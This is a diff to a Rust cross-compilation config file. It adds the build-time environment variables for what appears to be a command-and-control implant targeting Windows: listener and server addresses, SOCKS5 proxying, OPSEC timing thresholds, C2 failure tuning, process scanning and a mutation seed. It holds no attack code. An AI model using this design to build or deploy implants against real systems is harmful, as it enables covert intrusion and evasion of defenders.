@@ -1,3 +1,36 @@
+[build.env]
+# `cross` deliberately does not inherit arbitrary host variables. These are
+# the complete payload-build inputs consumed by build.rs; values are supplied
+# by the server/build shell at runtime and are never stored in this file.
+passthrough = [
+    "LISTENER_HOST",
+    "LISTENER_PORT",
+    "SERVER_URL",
+    "LISTENER_ID",
+    "SLEEP_INTERVAL",
+    "PAYLOAD_ID",
+    "PROTOCOL",
+    "SOCKS5_ENABLED",
+    "SOCKS5_HOST",
+    "SOCKS5_PORT",
+    "ALLOW_INVALID_CERTS",
+    "ENROLLMENT_CREDENTIAL",
+    "ALLOW_INSECURE_ISOLATED_LAB",
+    "BASE_SCORE_THRESHOLD_BG_TO_REDUCED",
+    "BASE_SCORE_THRESHOLD_REDUCED_TO_FULL",
+    "MIN_FULL_OPSEC_SECS",
+    "MIN_REDUCED_OPSEC_SECS",
+    "MIN_BG_OPSEC_SECS",
+    "REDUCED_ACTIVITY_SLEEP_SECS",
+    "BASE_MAX_C2_FAILS",
+    "C2_THRESH_INC_FACTOR",
+    "C2_THRESH_DEC_FACTOR",
+    "C2_THRESH_ADJ_INTERVAL",
+    "C2_THRESH_MAX_MULT",
+    "PROC_SCAN_INTERVAL_SECS",
+    "MUTATION_SEED",
+]
+
 [target.x86_64-pc-windows-gnu]
 image = "rustembedded/cross:x86_64-pc-windows-gnu"
 
